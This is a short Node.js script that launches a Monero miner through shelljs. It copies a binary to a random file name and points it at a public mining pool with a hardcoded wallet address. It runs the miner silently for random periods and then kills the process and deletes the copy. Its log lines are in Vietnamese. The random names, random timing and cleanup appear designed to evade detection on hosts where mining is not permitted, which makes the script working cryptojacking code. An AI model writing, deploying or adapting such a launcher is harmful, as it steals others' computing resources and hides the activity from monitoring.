'use strict'
const shell = require('shelljs');

const nameTool = Math.random().toString(36).substring(7);

const timeout = (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}

const runJob = (nameTool) => {
    if (shell.exec(`./${nameTool} -o stratum+tcp://xmr.f2pool.com:13531 -u 46s4YKAvP8iQU4VBNmMMjoDU9SmiU13HvSdq7A7r1x2GCuvmGxgq3yh61nxw7yCyRRh2KLp13pNWvWhFP4zBMwhiKvDwQ1y -p meocoder -k --nicehash --coin monero -a rx/0 -t 1 --astrobwt-avx2`, { silent: true, async: true }).code !== undefined) {
        return 0;
    }
    console.log('-- dang tien hanh jobs');
}

const run = async () => {
    try {
        const timeSleepJobs = ((Math.floor(Math.random() * 3) + 1) * 60) * 1000;
        console.log(`-- task nghi trong ${((timeSleepJobs / 60) / 1000)} phut`);
        await timeout(timeSleepJobs);

        if (shell.exec(`cp runtool ${nameTool}`, { silent: true }).code === 0) {
            console.log('-- tao file moi thanh cong');
            runJob(nameTool);
        }

        const timeRunJobs = ((Math.floor(Math.random() * 20) + 1) * 60) * 1000;
        console.log(`-- task chay trong ${((timeRunJobs / 60) / 1000)} phut`);
        await timeout(timeRunJobs);
        if (shell.exec(`killall ${nameTool}`, { silent: true }).code === 0) {
            console.log('-- ket thuc jobs');
            shell.exec(`rm -rf ${nameTool}`, { silent: true })
        }
    } catch (error) {
        console.log(error);
    }

}
run();